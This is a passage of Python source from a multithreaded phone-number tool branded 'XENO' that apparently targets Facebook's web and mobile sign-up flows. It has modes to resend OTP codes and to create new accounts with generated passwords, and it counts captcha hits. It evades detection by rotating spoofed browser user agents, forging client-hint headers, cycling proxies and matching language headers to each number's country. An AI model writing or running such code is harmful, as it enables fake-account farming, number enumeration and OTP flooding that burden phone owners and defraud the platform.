            return random.choice(['safari184_ios', 'safari180_ios', 'safari18_0_ios'])
        if ios_v >= 17:
            return random.choice(['safari172_ios', 'safari17_2_ios', 'safari17_0'])
        return random.choice(['safari155', 'safari15_5', 'safari153'])
    if 'Mac OS X' in user_agent and 'Safari' in user_agent and 'Chrome' not in user_agent:
        return random.choice(['safari260', 'safari2601', 'safari184', 'safari180'])
    chrome_v = get_chrome_major(user_agent)
    return pick_chrome_target(chrome_v, android=False)


def get_browser_ch_headers(user_agent, is_mobile=True):
    if any(k in user_agent for k in ('Firefox', 'KAIOS', 'iPhone', 'iPad', 'BlackBerry', 'BB10', 'Trident', 'IEMobile')):
        return {}
    if 'Mac OS X' in user_agent and 'Safari' in user_agent and 'Chrome' not in user_agent:
        return {}
    m_cv = re.search(r'Chrome/(\d+)', user_agent)
    chrome_major = int(m_cv.group(1)) if m_cv else 131
    if chrome_major < 89:
        return {}
    if 'Windows Phone' in user_agent:
        return {}
    if 'Android' in user_agent:
        platform = '"Android"'
    elif 'Windows' in user_agent:
        platform = '"Windows"'
    else:
        platform = '"Linux"'
    mobile = '?1' if ('Android' in user_agent or 'iPhone' in user_agent or is_mobile) else '?0'
    if 'SamsungBrowser' in user_agent:
        sm = re.search(r'SamsungBrowser/(\d+)', user_agent)
        sb_v = sm.group(1) if sm else '26'
        sec_ch = f'"Samsung Internet";v="{sb_v}", "Chromium";v="{chrome_major}", "Not:A-Brand";v="8"'
    elif 'Edg' in user_agent:
        em = re.search(r'Edg[A]?/(\d+)', user_agent)
        edg_v = em.group(1) if em else '133'
        sec_ch = f'"Microsoft Edge";v="{edg_v}", "Chromium";v="{chrome_major}", "Not:A-Brand";v="8"'
    elif 'OPR' in user_agent or 'Opera' in user_agent:
        om = re.search(r'OPR/(\d+)', user_agent)
        op_v = om.group(1) if om else '86'
        sec_ch = f'"Opera";v="{op_v}", "Chromium";v="{chrome_major}", "Not:A-Brand";v="8"'
    else:
        sec_ch = f'"Not:A-Brand";v="8", "Chromium";v="{chrome_major}", "Google Chrome";v="{chrome_major}"'

    full_ver_match = re.search(r'Chrome/([\d.]+)', user_agent)
    full_ver = full_ver_match.group(1) if full_ver_match else f'{chrome_major}.0.0.0'
    if 'SamsungBrowser' in user_agent:
        sm2 = re.search(r'SamsungBrowser/(\d+)', user_agent)
        sb_v2 = sm2.group(1) if sm2 else '26'
        full_ver_list = f'"Samsung Internet";v="{sb_v2}.0.0.0", "Chromium";v="{full_ver}", "Not:A-Brand";v="8.0.0.0"'
    elif 'Edg' in user_agent:
        em2 = re.search(r'Edg[A]?/([\d.]+)', user_agent)
        edg_fv = em2.group(1) if em2 else f'{chrome_major}.0.0.0'
        full_ver_list = f'"Microsoft Edge";v="{edg_fv}", "Chromium";v="{full_ver}", "Not:A-Brand";v="8.0.0.0"'
    elif 'OPR' in user_agent or 'Opera' in user_agent:
        om2 = re.search(r'OPR/([\d.]+)', user_agent)
        op_fv = om2.group(1) if om2 else f'{chrome_major}.0.0.0'
        full_ver_list = f'"Opera";v="{op_fv}", "Chromium";v="{full_ver}", "Not:A-Brand";v="8.0.0.0"'
    else:
        full_ver_list = f'"Not:A-Brand";v="8.0.0.0", "Chromium";v="{full_ver}", "Google Chrome";v="{full_ver}"'

    return {
        'sec-ch-ua': sec_ch,
        'sec-ch-ua-mobile': mobile,
        'sec-ch-ua-platform': platform,
        'sec-ch-ua-full-version-list': full_ver_list
    }


print_lock = threading.Lock()
counter_lock = threading.Lock()
file_lock = threading.Lock()

total_checked = 0
total_success = 0
total_failed = 0
total_error = 0
total_noacc = 0
total_nosms = 0
total_cap = 0
total_numbers = 0


def reset_counters():
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap, total_numbers
    total_checked = 0
    total_success = 0
    total_failed = 0
    total_error = 0
    total_noacc = 0
    total_nosms = 0
    total_cap = 0
    total_numbers = 0


def set_total_numbers(n):
    global total_numbers
    total_numbers = n


def get_status_bar():
    pct = (total_checked / total_numbers * 100) if total_numbers > 0 else 0.0
    return (
        f'\r{GREEN}  XENO ⮞ {WHITE}[{total_checked}/{total_numbers}] {pct:.1f}% '
        f'{CYAN}⟫ {GREEN}OK: {total_success} '
        f'{CYAN}⟫ {YELLOW}NoAcc: {total_noacc} '
        f'{CYAN}⟫ {YELLOW}NoSMS: {total_nosms} '
        f'{CYAN}⟫ {YELLOW}Cap: {total_cap} '
        f'{CYAN}⟫ {RED}Err: {total_error}{RESET}     '
    )


def safe_print(text):
    with print_lock:
        try:
            sys.stdout.write('\r                                                                                \r')
            sys.stdout.write(text + '\n')
        except UnicodeEncodeError:
            sys.stdout.write(text.encode('utf-8', errors='ignore').decode('utf-8') + '\n')
        sys.stdout.write(get_status_bar())
        sys.stdout.flush()


def update_counter(status, number=None, message=None, color=None):
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap
    with counter_lock:
        if status == 'success':
            total_success += 1
        elif status == 'failed':
            total_failed += 1
        elif status == 'error':
            total_error += 1
        elif status == 'noacc':
            total_noacc += 1
        elif status == 'nosms':
            total_nosms += 1
        elif status == 'cap':
            total_cap += 1
        total_checked += 1
    if message:
        if number:
            safe_print(f' {color or WHITE}{number} {message}{RESET}')
        else:
            safe_print(f' {color or WHITE}{message}{RESET}')
    else:
        with print_lock:
            sys.stdout.write(get_status_bar())
            sys.stdout.flush()


def generate_s_val():
    return ':'.join(''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) for _ in range(3))


def generate_qpl_join_id():
    return 'f' + ''.join(random.choices('0123456789abcdef', k=17))


def generate_password(length=None):
    if length is None:
        length = random.randint(8, 12)
    pwd_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%'
    return ''.join(random.choice(pwd_chars) for _ in range(length))


def save_remaining_numbers(remaining_numbers):
    num_file = get_number_file_path()
    with file_lock:
        try:
            with open(num_file, 'w', encoding='utf-8', errors='ignore') as f_out:
                for num in remaining_numbers:
                    f_out.write(f'{num}\n')
        except Exception:
            pass


def save_failed_number(number):
    pass


def save_success_number(number):
    pass


def save_registered_number(number):
    num_str = str(number).strip()
    if not num_str.startswith('+'):
        num_str = '+' + num_str
    reg_file = get_registered_file_path()
    with file_lock:
        try:
            with open(reg_file, 'a', encoding='utf-8') as f:
                f.write(num_str + '\n')
                f.flush()
        except Exception:
            pass


def get_windows_chrome():
    ua, label = random.choice(WINDOWS_CHROME_VERSIONS)
    return ua


def get_modern_mobile():
    pool = ANDROID_CHROME_VERSIONS[:6] + IOS_SAFARI_VERSIONS
    ua, label = random.choice(pool)
    return ua


def setup_user_agent(setting_key='api_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    ua_set = settings.get('user_agent_settings', {})
    ask_ua = ua_set.get('ask_for_user_agent', True)
    if setting_key == 'web_facebook_settings':
        win_chrome_catalog = [
            ('Win Chrome 156 (Desktop - Latest)', lambda: WINDOWS_CHROME_VERSIONS[0][0]),
            ('Win Chrome 146 (Desktop)', lambda: WINDOWS_CHROME_VERSIONS[2][0]),
            ('Win Chrome 145 (Desktop)', lambda: WINDOWS_CHROME_VERSIONS[4][0]),
            ('Win Chrome 136 (Desktop)', lambda: WINDOWS_CHROME_VERSIONS[6][0]),
            ('Win Chrome 133 / 131 (Desktop)', lambda: random.choice(WINDOWS_CHROME_VERSIONS[7:])[0])
        ]
        if not ask_ua:
            print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} Windows Chrome (Rotate All Versions)')
            time.sleep(0.5)
            return lambda: random.choice(WINDOWS_CHROME_VERSIONS)[0]
        print(f' {opt_labels[0]} Rotate All Windows Chrome (Recommended)')
        print(f' {opt_labels[1]} Specific Windows Chrome Version (Select 1 by 1)')
        print(LINE)
        win_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select User-Agent Mode [Default: 01] {EKL} ').strip().lower()
        if win_choice in ('2', '02', 'single', 'one'):
            clear_logo()
            print(f' {CYAN}Select Specific Windows Chrome User-Agent:{RESET}')
            for idx, (label, _) in enumerate(win_chrome_catalog):
                print(f' {opt_labels[idx]} {label}')
            print(LINE)
            sub_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select UA Type [Default: 01] {EKL} ').strip()
            selected_funcs = []
            selected_labels = []
            parts = [p for p in re.split(r'[,;\s]+', sub_choice) if p]
            for part in parts:
                if part.isdigit():
                    num = int(part)
                    if 1 <= num <= len(win_chrome_catalog):
                        lbl, fn = win_chrome_catalog[num - 1]
                        selected_funcs.append(fn)
                        selected_labels.append(lbl)
            if not selected_funcs:
                lbl, fn = win_chrome_catalog[0]
                selected_funcs.append(fn)
                selected_labels.append(lbl)
            label_text = selected_labels[0] if len(selected_labels) == 1 else ', '.join(selected_labels) + ' (Rotating)'
            print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} {label_text}')
            time.sleep(0.5)
            if len(selected_funcs) == 1:
                return selected_funcs[0]
            return lambda: random.choice(selected_funcs)()
        print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} Windows Chrome (Rotate All Versions)')
        time.sleep(0.5)
        return lambda: random.choice(WINDOWS_CHROME_VERSIONS)[0]

    if setting_key == 'mfacebook_settings':
        android_catalog = [
            ('Android 12-15 (Modern Devices - Recommended)', get_android_12_15),
            ('Android 7-11 (Mid Devices)', get_android_7_11),
            ('Samsung Galaxy & Pixel Chrome (High Trust)', lambda: random.choice(ANDROID_CHROME_VERSIONS)[0])
        ]
        if not ask_ua:
            print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} All Android UAs (Rotate All Versions)')
            time.sleep(0.5)
            return lambda: random.choice([get_android_12_15, get_android_7_11, lambda: random.choice(ANDROID_CHROME_VERSIONS)[0]])()
        print(f' {opt_labels[0]} Rotate All Android User-Agents (Recommended)')
        print(f' {opt_labels[1]} Specific Android Version (Select 1 by 1)')
        print(LINE)
        android_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select User-Agent Mode [Default: 01] {EKL} ').strip().lower()
        if android_choice in ('2', '02', 'single', 'one'):
            clear_logo()
            print(f' {CYAN}Select Specific Android User-Agent:{RESET}')
            for idx, (label, _) in enumerate(android_catalog):
                print(f' {opt_labels[idx]} {label}')
            print(LINE)
            sub_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select UA Type [Default: 01] {EKL} ').strip()
            selected_funcs = []
            selected_labels = []
            parts = [p for p in re.split(r'[,;\s]+', sub_choice) if p]
            for part in parts:
                if part.isdigit():
                    num = int(part)
                    if 1 <= num <= len(android_catalog):
                        lbl, fn = android_catalog[num - 1]
                        selected_funcs.append(fn)
                        selected_labels.append(lbl)
            if not selected_funcs:
                lbl, fn = android_catalog[0]
                selected_funcs.append(fn)
                selected_labels.append(lbl)
            label_text = selected_labels[0] if len(selected_labels) == 1 else ', '.join(selected_labels) + ' (Rotating)'
            print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} {label_text}')
            time.sleep(0.5)
            if len(selected_funcs) == 1:
                return selected_funcs[0]
            return lambda: random.choice(selected_funcs)()
        print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} All Android UAs (Rotate All Versions)')
        time.sleep(0.5)
        return lambda: random.choice([get_android_12_15, get_android_7_11, lambda: random.choice(ANDROID_CHROME_VERSIONS)[0]])()

    android_funcs = [get_android_12_15, get_android_7_11]
    all_funcs = [get_android_12_15, get_android_7_11, get_ios_new, get_ios_medium, get_ipad_new, get_windows_chrome, get_modern_mobile]
    ua_catalog = [
        ('Android 12-15 (Modern Devices - Recommended)', get_android_12_15),
        ('Android 7-11 (Mid Devices)', get_android_7_11),
        ('iOS New (iOS 16-18 - High Trust)', get_ios_new),
        ('iOS Medium (iOS 13-15)', get_ios_medium),
        ('iPad New (iPadOS 15-18)', get_ipad_new),
        ('Windows Chrome (Desktop - High Trust)', get_windows_chrome),
        ('Modern Mobile Mix (Android + iOS)', get_modern_mobile)
    ]
    if not ask_ua:
        print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} All Android UAs Rotate (Auto)')
        time.sleep(0.5)
        return lambda: random.choice(android_funcs)()
    print(f' {opt_labels[0]} All Android User-Agents (Rotate All Android)')
    print(f' {opt_labels[1]} All User-Agents (Rotate All Platforms)')
    print(f' {opt_labels[2]} Specific User-Agent (Select 1 by 1)')
    print(LINE)
    choice = input(f'{GREEN} [{RED}◆{GREEN}] Select User-Agent Mode [Default: 01] {EKL} ').strip().lower()
    if choice in ('2', '02', 'all'):
        print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} All Platforms UAs Rotate')
        time.sleep(0.5)
        return lambda: random.choice(all_funcs)()
    if choice in ('3', '03', 'single', 'one'):
        clear_logo()
        print(f' {CYAN}Select Specific User-Agent (Pick 1 or comma-separated):{RESET}')
        for idx, (label, _) in enumerate(ua_catalog):
            print(f' {opt_labels[idx]} {label}')
        print(LINE)
        sub_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select UA Type [Default: 01] {EKL} ').strip()
        selected_funcs = []
        selected_labels = []
        parts = [p for p in re.split(r'[,;\s]+', sub_choice) if p]
        for part in parts:
            if part.isdigit():
                num = int(part)
                if 1 <= num <= len(ua_catalog):
                    lbl, fn = ua_catalog[num - 1]
                    selected_funcs.append(fn)
                    selected_labels.append(lbl)
        if not selected_funcs:
            lbl, fn = ua_catalog[0]
            selected_funcs.append(fn)
            selected_labels.append(lbl)
        label_text = selected_labels[0] if len(selected_labels) == 1 else ', '.join(selected_labels) + ' (Rotating)'
        print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} {label_text}')
        time.sleep(0.5)
        if len(selected_funcs) == 1:
            return selected_funcs[0]
        return lambda: random.choice(selected_funcs)()
    print(f'{GREEN} [{RED}◆{GREEN}] User-Agent Selected {EKL} All Android + Win Chrome (Auto)')
    time.sleep(0.5)
    return lambda: random.choice(android_funcs + [get_windows_chrome, get_modern_mobile])()


def setup_proxies(setting_key='api_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    proxy_set = settings.get('proxy_settings', {})
    ask_proxy = proxy_set.get('ask_for_proxy', True)
    use_proxy = False
    if ask_proxy:
        print(f' {opt_labels[0]} Real IP (Direct Connection)')
        print(f' {opt_labels[1]} Proxy (Use Proxy List / Settings)')
        print(LINE)
        choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Connection Mode {EKL} ').strip()
        if choice in ('2', '02'):
            use_proxy = True
    else:
        proxy_file = get_proxy_file_path()
        has_txt = os.path.exists(proxy_file) and os.path.getsize(proxy_file) > 0
        def_proxy = proxy_set.get('default_proxy', '')
        if has_txt or def_proxy:
            use_proxy = True
    if use_proxy:
        PROXY_LIST = get_proxy_list(settings_key=setting_key)
        if PROXY_LIST:
            PROXY_ITERATOR = itertools.cycle(PROXY_LIST)
            print(f'{GREEN} [{RED}◆{GREEN}] Total Proxies Loaded {EKL} {len(PROXY_LIST)}')
            print(f'{GREEN} [{RED}◆{GREEN}] Data Saver Mode     {EKL} ⚡ ACTIVE (Direct API / Zero IP-API overhead)')
            return PROXY_LIST, PROXY_ITERATOR
        else:
            print(f'{YELLOW} No proxies found. Proceeding with Real IP connection.')
    print(f'{GREEN} [{RED}◆{GREEN}] Connection Mode {EKL} Real IP (Direct)')
    time.sleep(1)
    return [], None


def setup_browser(setting_key='selenium_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    browser_set = settings.get('browser_settings', {})
    ask_browser = browser_set.get('ask_for_browser', True)
    def_browser = browser_set.get('default_browser', 'chrome').strip().lower()
    if not ask_browser:
        print(f'{GREEN} [{RED}◆{GREEN}] Default Browser Selected {EKL} {def_browser.capitalize()}')
        return def_browser
    print(f' {opt_labels[0]} Google Chrome (Default)')
    print(f' {opt_labels[1]} Microsoft Edge')
    print(f' {opt_labels[2]} Mozilla Firefox')
    print(f' {opt_labels[3]} Brave Browser')
    print(f' {opt_labels[4]} Opera Browser\n')
    print(LINE)
    choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Browser {EKL} ').strip().lower()
    if choice in ('2', '02', 'edge'):
        return 'edge'
    if choice in ('3', '03', 'firefox'):
        return 'firefox'
    if choice in ('4', '04', 'brave'):
        return 'brave'
    if choice in ('5', '05', 'opera'):
        return 'opera'
    return 'chrome'


def setup_headless_mode(setting_key='selenium_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    headless_set = settings.get('headless_settings', {})
    ask_headless = headless_set.get('ask_for_headless', True)
    def_headless = headless_set.get('default_headless', False)
    if not ask_headless:
        print(f'{GREEN} [{RED}◆{GREEN}] Headless Mode {EKL} {def_headless} (From Config)')
        return bool(def_headless)
    print(f' {opt_labels[0]} Visible (UI Open)')
    print(f' {opt_labels[1]} Headless (Background)\n')
    print(LINE)
    h_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Mode {EKL} ').strip()
    return h_choice in ('2', '02')


def setup_start_route(setting_key='selenium_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    route_set = settings.get('route_settings', {})
    ask_route = route_set.get('ask_for_route', True)
    def_route = route_set.get('default_route', 0)
    if not ask_route:
        print(f'{GREEN} [{RED}◆{GREEN}] Start Route {EKL} {def_route} (From Config)')
        return int(def_route)
    print(f' {opt_labels[0]} Start from Home (Default)')
    print(f' {opt_labels[1]} Start from Auth Page\n')
    print(LINE)
    route_choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Starting Route {EKL} ').strip()
    return 1 if route_choice in ('2', '02') else 0


def setup_work_mode(setting_key='selenium_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    work_set = settings.get('work_mode', {})
    ask_mode = work_set.get('ask_for_mode', True)
    def_mode = work_set.get('default_mode', 0)
    if not ask_mode:
        print(f'{GREEN} [{RED}◆{GREEN}] Work Mode {EKL} {def_mode} (From Config)')
        return int(def_mode)
    print(f' {opt_labels[0]} Both (Resend + Create)')
    print(f' {opt_labels[1]} Resend Only (Ignore Create New Account)')
    print(f' {opt_labels[2]} Create Only (Ignore Existing Accounts)\n')
    print(LINE)
    wm = input(f'{GREEN} [{RED}◆{GREEN}] Select Work Mode [Enter for Default] {EKL} ').strip()
    if wm in ('0', '1', '01'):
        work_mode = 0
    elif wm in ('2', '02'):
        work_mode = 1
    elif wm in ('3', '03'):
        work_mode = 2
    else:
        work_mode = int(def_mode)
    return work_mode


def setup_otp_resend(setting_key='api_settings'):
    clear_logo()
    settings = load_settings(setting_key)
    otp_set = settings.get('otp_settings', {})
    ask_resend = otp_set.get('ask_for_resend_count', True)
    def_resend = otp_set.get('default_resend_count', 1)
    if not ask_resend:
        print(f'{GREEN} [{RED}◆{GREEN}] Resend OTP Count {EKL} {def_resend} (From Config)')
        return int(def_resend)
    print(f'{WHITE} How many times to Resend OTP? (0 to disable Resend)')
    r_inp = input(f'{GREEN} [{RED}◆{GREEN}] Resend Count [Default: {def_resend}] {EKL} ').strip()
    if not r_inp:
        resend_count = int(def_resend)
    else:
        try:
            resend_count = max(0, int(r_inp))
        except Exception:
            print(f'{RED} Invalid input. Using Default {EKL} {def_resend}')
            resend_count = int(def_resend)
    print(f'{GREEN} [{RED}◆{GREEN}] Resend OTP Set to {EKL} {resend_count}')
    return resend_count


def setup_threads(setting_key='api_settings'):
    settings = load_settings(setting_key)
    thread_set = settings.get('thread_settings', {})
    ask_threads = thread_set.get('ask_for_threads', True)
    def_threads = thread_set.get('default_threads', 20)
    if not ask_threads:
        print(f'{GREEN} [{RED}◆{GREEN}] Threads {EKL} {def_threads} (From Config)')
        return int(def_threads)
    print(LINE)
    w_inp = input(f'\n{GREEN} [{RED}◆{GREEN}] Enter number of Threads/Workers [{def_threads}] {EKL} ').strip()
    if not w_inp:
        return int(def_threads)
    try:
        return max(1, int(w_inp))
    except Exception:
        return int(def_threads)


def display_final_summary(continuous_mode=False):
    with print_lock:
        sys.stdout.write('\r                                                                                \r')
        sys.stdout.flush()
    print(f'\n{LINE}')
    print(f'{GREEN} [{RED}◆{GREEN}] {WHITE}Completed Processing {total_checked} Numbers.')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Success {EKL} {total_success}')
    print(f'{GREEN} [{RED}◆{GREEN}] {YELLOW}Total Failed  {EKL} {total_failed}')
    print(f'{GREEN} [{RED}◆{GREEN}] {RED}Total Error   {EKL} {total_error}')
    print(LINE)
    if not continuous_mode:
        settings = load_settings('api_settings').get('file_input_settings', {})
        if not settings.get('always_use_txt', False):
            input(f'{WHITE} Press Enter to exit...')


_PREFIX_TO_COUNTRY = {
    '1': {'lang': 'en-US,en;q=0.9', 'country': 'US', 'browser_lang': ['en-US', 'en']},
    '52': {'lang': 'es-MX,es;q=0.9,en-US;q=0.8', 'country': 'MX', 'browser_lang': ['es-MX', 'es', 'en-US']},
    '55': {'lang': 'pt-BR,pt;q=0.9,en-US;q=0.8', 'country': 'BR', 'browser_lang': ['pt-BR', 'pt', 'en-US']},
    '54': {'lang': 'es-AR,es;q=0.9,en-US;q=0.8', 'country': 'AR', 'browser_lang': ['es-AR', 'es', 'en-US']},
    '57': {'lang': 'es-CO,es;q=0.9,en-US;q=0.8', 'country': 'CO', 'browser_lang': ['es-CO', 'es', 'en-US']},
    '51': {'lang': 'es-PE,es;q=0.9,en-US;q=0.8', 'country': 'PE', 'browser_lang': ['es-PE', 'es', 'en-US']},
    '56': {'lang': 'es-CL,es;q=0.9,en-US;q=0.8', 'country': 'CL', 'browser_lang': ['es-CL', 'es', 'en-US']},
    '58': {'lang': 'es-VE,es;q=0.9,en-US;q=0.8', 'country': 'VE', 'browser_lang': ['es-VE', 'es', 'en-US']},
    '593': {'lang': 'es-EC,es;q=0.9,en-US;q=0.8', 'country': 'EC', 'browser_lang': ['es-EC', 'es', 'en-US']},
    '591': {'lang': 'es-BO,es;q=0.9,en-US;q=0.8', 'country': 'BO', 'browser_lang': ['es-BO', 'es', 'en-US']},
    '595': {'lang': 'es-PY,es;q=0.9,en-US;q=0.8', 'country': 'PY', 'browser_lang': ['es-PY', 'es', 'en-US']},
    '598': {'lang': 'es-UY,es;q=0.9,en-US;q=0.8', 'country': 'UY', 'browser_lang': ['es-UY', 'es', 'en-US']},
    '44': {'lang': 'en-GB,en;q=0.9,en-US;q=0.8', 'country': 'GB', 'browser_lang': ['en-GB', 'en', 'en-US']},
    '33': {'lang': 'fr-FR,fr;q=0.9,en-US;q=0.8', 'country': 'FR', 'browser_lang': ['fr-FR', 'fr', 'en-US']},
    '49': {'lang': 'de-DE,de;q=0.9,en-US;q=0.8', 'country': 'DE', 'browser_lang': ['de-DE', 'de', 'en-US']},
    '39': {'lang': 'it-IT,it;q=0.9,en-US;q=0.8', 'country': 'IT', 'browser_lang': ['it-IT', 'it', 'en-US']},
    '34': {'lang': 'es-ES,es;q=0.9,en-US;q=0.8', 'country': 'ES', 'browser_lang': ['es-ES', 'es', 'en-US']},
    '31': {'lang': 'nl-NL,nl;q=0.9,en-US;q=0.8', 'country': 'NL', 'browser_lang': ['nl-NL', 'nl', 'en-US']},
    '32': {'lang': 'nl-BE,nl;q=0.9,fr;q=0.8,en-US;q=0.7', 'country': 'BE', 'browser_lang': ['nl-BE', 'nl', 'fr', 'en-US']},
    '41': {'lang': 'de-CH,de;q=0.9,fr;q=0.8,it;q=0.7', 'country': 'CH', 'browser_lang': ['de-CH', 'de', 'fr', 'it']},
    '43': {'lang': 'de-AT,de;q=0.9,en-US;q=0.8', 'country': 'AT', 'browser_lang': ['de-AT', 'de', 'en-US']},
    '46': {'lang': 'sv-SE,sv;q=0.9,en-US;q=0.8', 'country': 'SE', 'browser_lang': ['sv-SE', 'sv', 'en-US']},
    '47': {'lang': 'no-NO,no;q=0.9,en-US;q=0.8', 'country': 'NO', 'browser_lang': ['no-NO', 'no', 'en-US']},
    '45': {'lang': 'da-DK,da;q=0.9,en-US;q=0.8', 'country': 'DK', 'browser_lang': ['da-DK', 'da', 'en-US']},
    '358': {'lang': 'fi-FI,fi;q=0.9,en-US;q=0.8', 'country': 'FI', 'browser_lang': ['fi-FI', 'fi', 'en-US']},
    '48': {'lang': 'pl-PL,pl;q=0.9,en-US;q=0.8', 'country': 'PL', 'browser_lang': ['pl-PL', 'pl', 'en-US']},
    '420': {'lang': 'cs-CZ,cs;q=0.9,en-US;q=0.8', 'country': 'CZ', 'browser_lang': ['cs-CZ', 'cs', 'en-US']},
    '351': {'lang': 'pt-PT,pt;q=0.9,en-US;q=0.8', 'country': 'PT', 'browser_lang': ['pt-PT', 'pt', 'en-US']},
    '30': {'lang': 'el-GR,el;q=0.9,en-US;q=0.8', 'country': 'GR', 'browser_lang': ['el-GR', 'el', 'en-US']},
    '36': {'lang': 'hu-HU,hu;q=0.9,en-US;q=0.8', 'country': 'HU', 'browser_lang': ['hu-HU', 'hu', 'en-US']},
    '7': {'lang': 'ru-RU,ru;q=0.9,en-US;q=0.8', 'country': 'RU', 'browser_lang': ['ru-RU', 'ru', 'en-US']},
    '380': {'lang': 'uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7', 'country': 'UA', 'browser_lang': ['uk-UA', 'uk', 'ru', 'en-US']},
    '375': {'lang': 'be-BY,be;q=0.9,ru;q=0.8,en-US;q=0.7', 'country': 'BY', 'browser_lang': ['be-BY', 'be', 'ru', 'en-US']},
    '86': {'lang': 'zh-CN,zh;q=0.9,en-US;q=0.8', 'country': 'CN', 'browser_lang': ['zh-CN', 'zh', 'en-US']},
    '91': {'lang': 'hi-IN,hi;q=0.9,en-US;q=0.8', 'country': 'IN', 'browser_lang': ['hi-IN', 'hi', 'en-US']},
    '81': {'lang': 'ja-JP,ja;q=0.9,en-US;q=0.8', 'country': 'JP', 'browser_lang': ['ja-JP', 'ja', 'en-US']},
    '82': {'lang': 'ko-KR,ko;q=0.9,en-US;q=0.8', 'country': 'KR', 'browser_lang': ['ko-KR', 'ko', 'en-US']},
    '62': {'lang': 'id-ID,id;q=0.9,en-US;q=0.8', 'country': 'ID', 'browser_lang': ['id-ID', 'id', 'en-US']},
    '92': {'lang': 'ur-PK,ur;q=0.9,en-US;q=0.8', 'country': 'PK', 'browser_lang': ['ur-PK', 'ur', 'en-US']},
    '880': {'lang': 'bn-BD,bn;q=0.9,en-US;q=0.8', 'country': 'BD', 'browser_lang': ['bn-BD', 'bn', 'en-US']},
    '84': {'lang': 'vi-VN,vi;q=0.9,en-US;q=0.8', 'country': 'VN', 'browser_lang': ['vi-VN', 'vi', 'en-US']},
    '66': {'lang': 'th-TH,th;q=0.9,en-US;q=0.8', 'country': 'TH', 'browser_lang': ['th-TH', 'th', 'en-US']},
    '63': {'lang': 'fil-PH,fil;q=0.9,en-US;q=0.8', 'country': 'PH', 'browser_lang': ['fil-PH', 'fil', 'en-US']},
    '60': {'lang': 'ms-MY,ms;q=0.9,en-US;q=0.8', 'country': 'MY', 'browser_lang': ['ms-MY', 'ms', 'en-US']},
    '95': {'lang': 'my-MM,my;q=0.9,en-US;q=0.8', 'country': 'MM', 'browser_lang': ['my-MM', 'my', 'en-US']},
    '94': {'lang': 'si-LK,si;q=0.9,en-US;q=0.8', 'country': 'LK', 'browser_lang': ['si-LK', 'si', 'en-US']},
    '977': {'lang': 'ne-NP,ne;q=0.9,en-US;q=0.8', 'country': 'NP', 'browser_lang': ['ne-NP', 'ne', 'en-US']},
    '98': {'lang': 'fa-IR,fa;q=0.9,en-US;q=0.8', 'country': 'IR', 'browser_lang': ['fa-IR', 'fa', 'en-US']},
    '966': {'lang': 'ar-SA,ar;q=0.9,en-US;q=0.8', 'country': 'SA', 'browser_lang': ['ar-SA', 'ar', 'en-US']},
    '971': {'lang': 'ar-AE,ar;q=0.9,en-US;q=0.8', 'country': 'AE', 'browser_lang': ['ar-AE', 'ar', 'en-US']},
    '972': {'lang': 'he-IL,he;q=0.9,en-US;q=0.8', 'country': 'IL', 'browser_lang': ['he-IL', 'he', 'en-US']},
    '90': {'lang': 'tr-TR,tr;q=0.9,en-US;q=0.8', 'country': 'TR', 'browser_lang': ['tr-TR', 'tr', 'en-US']},
    '998': {'lang': 'uz-UZ,uz;q=0.9,ru;q=0.8,en-US;q=0.7', 'country': 'UZ', 'browser_lang': ['uz-UZ', 'uz', 'ru', 'en-US']},
    '93': {'lang': 'fa-AF,fa;q=0.9,ps;q=0.8,en-US;q=0.7', 'country': 'AF', 'browser_lang': ['fa-AF', 'fa', 'ps', 'en-US']},
    '964': {'lang': 'ar-IQ,ar;q=0.9,en-US;q=0.8', 'country': 'IQ', 'browser_lang': ['ar-IQ', 'ar', 'en-US']},
    '962': {'lang': 'ar-JO,ar;q=0.9,en-US;q=0.8', 'country': 'JO', 'browser_lang': ['ar-JO', 'ar', 'en-US']},
    '961': {'lang': 'ar-LB,ar;q=0.9,en-US;q=0.8', 'country': 'LB', 'browser_lang': ['ar-LB', 'ar', 'en-US']},
    '965': {'lang': 'ar-KW,ar;q=0.9,en-US;q=0.8', 'country': 'KW', 'browser_lang': ['ar-KW', 'ar', 'en-US']},
    '974': {'lang': 'ar-QA,ar;q=0.9,en-US;q=0.8', 'country': 'QA', 'browser_lang': ['ar-QA', 'ar', 'en-US']},
    '973': {'lang': 'ar-BH,ar;q=0.9,en-US;q=0.8', 'country': 'BH', 'browser_lang': ['ar-BH', 'ar', 'en-US']},
    '968': {'lang': 'ar-OM,ar;q=0.9,en-US;q=0.8', 'country': 'OM', 'browser_lang': ['ar-OM', 'ar', 'en-US']},
    '963': {'lang': 'ar-SY,ar;q=0.9,en-US;q=0.8', 'country': 'SY', 'browser_lang': ['ar-SY', 'ar', 'en-US']},
    '967': {'lang': 'ar-YE,ar;q=0.9,en-US;q=0.8', 'country': 'YE', 'browser_lang': ['ar-YE', 'ar', 'en-US']},
